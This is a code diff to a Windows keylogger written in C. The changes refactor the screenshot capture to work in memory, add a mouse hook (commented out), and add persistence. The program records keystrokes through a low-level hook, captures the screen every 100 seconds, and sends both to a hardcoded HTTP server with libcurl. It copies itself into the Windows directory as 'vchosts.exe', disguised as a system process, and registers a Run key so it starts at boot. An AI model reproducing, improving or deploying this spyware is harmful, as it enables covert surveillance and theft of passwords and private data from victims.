@@ -4,12 +4,16 @@
 #include "lodepng.h"
 
 #define BUFFERLEN 1024
+#define SNAPSHOT_SEC 100
+#define SERVER "http://192.168.1.100/send/send.php"
+
 char *buffer;
 unsigned int bufferIndex = 0;
 unsigned int bufferSize = BUFFERLEN;
 HANDLE mutex;
+HHOOK hKeyHook, hMouseHook;
 
-BOOL SaveBMPFile(char *filename, HBITMAP bitmap, HDC bitmapDC, int width, int height)
+BOOL GetBMPScreen(HBITMAP bitmap, HDC bitmapDC, int width, int height, unsigned char** bufferOut, unsigned int* lengthOut)
 {
     BOOL Success=FALSE;
     HDC SurfDC=NULL;        // GDI-compatible device context for the surface
@@ -61,25 +65,12 @@ BOOL SaveBMPFile(char *filename, HBITMAP bitmap, HDC bitmapDC, int width, int he
 		png[newpos + 2] = ((char *)lpvBits)[bmpos + 0]; //B
 		png[newpos + 3] = 255;            //A
 	}
-	  
-    lodepng_encode32_file(filename, png, width, height);
-	CloseHandle(BmpFile);
-	free(lpvBits);
+	
+	free(lpvBits);    
+    lodepng_encode32_memory(png, width, height, bufferOut, lengthOut);
+	free(png);
+	
     return TRUE;
-}
-
-BOOL ScreenCapture(char *filename)
-{	
-	HDC hDc = CreateCompatibleDC(0);
-	int width = GetDeviceCaps(hDc, HORZRES);
-	int height = GetDeviceCaps(hDc, VERTRES);
-	HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
-	SelectObject(hDc, hBmp);
-	BitBlt(hDc, 0, 0, width, height, GetDC(0), 0, 0, SRCCOPY);
-	BOOL ret = SaveBMPFile(filename, hBmp, hDc, width, height);
-	DeleteObject(hBmp);
-	DeleteObject(hDc);
-	return ret;
 }
 
 
@@ -112,7 +103,7 @@ int CurlSend(char *data, int length, char *postParamName)
 		strcpy(sendStr, inputStr);
 		strcat(sendStr, httpStr);
 		
-		curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.1.100/send/send.php");
+		curl_easy_setopt(curl, CURLOPT_URL, SERVER);
 		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, sendStr);
 		res = curl_easy_perform(curl);
 		curl_easy_cleanup(curl);
@@ -164,7 +155,7 @@ void SaveKey(unsigned int key)
 	
 	if (strlen(keyStr) >= available)
 	{
-		bufferSize *= 2; // raddoppio la grandezza del buffer
+		bufferSize *= 2;
 		buffer = realloc(buffer, bufferSize);
 	}
 	
@@ -174,23 +165,55 @@ void SaveKey(unsigned int key)
 	ReleaseMutex(mutex);
 }
 
-LRESULT CALLBACK RawInput(int nCode, WPARAM wParam, LPARAM lParam)
+void SendScreenshot()
 {
-	KBDLLHOOKSTRUCT *keyboard = (KBDLLHOOKSTRUCT *)lParam;
+	HDC hDc = CreateCompatibleDC(0);
+	int width = GetDeviceCaps(hDc, HORZRES);
+	int height = GetDeviceCaps(hDc, VERTRES);
+	HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
+	SelectObject(hDc, hBmp);
+	BitBlt(hDc, 0, 0, width, height, GetDC(0), 0, 0, SRCCOPY);
+	
+	unsigned char *image;
+	unsigned int len;
+	
+	BOOL ret = GetBMPScreen(hBmp, hDc, width, height, &image, &len);
+	
+	DeleteObject(hBmp);
+	DeleteObject(hDc);
+	
+	CurlSend(image, len, "image=");	
+	lodepng_memory_free(image);
+}
 
-	if (wParam == WM_KEYDOWN)
+LRESULT CALLBACK RawInputMouse(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	MOUSEHOOKSTRUCT *mouse = (MOUSEHOOKSTRUCT *)lParam;
+
+	if (nCode == HC_ACTION && wParam == WM_LBUTTONDOWN)
 	{
-		SaveKey(keyboard->vkCode);
+		SendScreenshot();
 	}
 	
-	return 0;
+	return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
+}
+
+LRESULT CALLBACK RawInputKeyboard(HWND hwnd, int nCode, WPARAM wParam, LPARAM lParam)
+{
+	if(nCode == WM_KEYDOWN)
+	{
+		KBDLLHOOKSTRUCT *keyboard = (KBDLLHOOKSTRUCT *)wParam;
+		SaveKey(keyboard->vkCode);
+	}
+
+	return DefWindowProc(hwnd, nCode, wParam, lParam);
 }
 
 DWORD WINAPI KeyLogger()
 {
-	HHOOK hKeyHook;
 	HINSTANCE hExe = GetModuleHandle(NULL);
-	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)RawInput, hExe, 0);
+	//hMouseHook = SetWindowsHookEx(WH_MOUSE_LL,(HOOKPROC)RawInputMouse, hExe, 0);
+	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)RawInputKeyboard, hExe, 0);
 	MSG msg;
 	
 	while (GetMessage(&msg, NULL, 0, 0) != 0)
@@ -202,31 +225,29 @@ DWORD WINAPI KeyLogger()
 	return 0;
 }
 
-void SendScreenshot()
+
+void Hook(char* self, int mode)
 {
-	ScreenCapture("data");
-	
-	FILE *img = fopen("data", "rb");
-	
-	if(img > 0)
-	{
-		fseek(img, 0, SEEK_END);
-		long len = ftell(img);
-		fseek(img, 0, SEEK_SET);
+	unsigned char path[1024];
+	int err;
+	HKEY hkey;
+	FILE *test;
 		
-		if(len > 0)
-		{
-			char *image = (char *)malloc(len);
-			fread(image, 1, len, img);
-			CurlSend(image, len, "image=");
-			free(image);
-		}
-		fclose(img);
-	}
+	GetWindowsDirectory(path, 1024);
+	strcat(path, "\\vchosts.exe");
+	CopyFile(self, path, 0);
+	
+	RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
+		RegSetValueEx(hkey,"wincmd32", 0, REG_SZ, path, strlen(path));
+		RegCloseKey(hkey);
+
+	return;
 }
 
-int main(void)
-{			
+int main(int argn, char* argv[])
+{
+	Hook(argv[0], 1);
+	
 	mutex = CreateMutex(NULL, FALSE, NULL);
 	
 	buffer = (char*)malloc(BUFFERLEN);
@@ -235,15 +256,18 @@ int main(void)
 	HANDLE logger;
 	logger = CreateThread(NULL, 0, KeyLogger, NULL, 0, NULL);
 	
-	int timer = 0;
+	unsigned int timer = 0;
 	int len;
 	
 	while(1)
 	{
-		if(timer > 10)
-		{	
+		if(timer % SNAPSHOT_SEC == 0)
+		{
 			SendScreenshot();
-			
+		}
+		
+		if(timer % 10 == 0)
+		{	
 			// lock
 			WaitForSingleObject(mutex, INFINITE);
 			
@@ -264,8 +288,6 @@ int main(void)
 				// unlock
 				ReleaseMutex(mutex);
 			}
-			
-			timer = 0;
 		}
 		timer++;
 		Sleep(1000); // 1 sec sleep
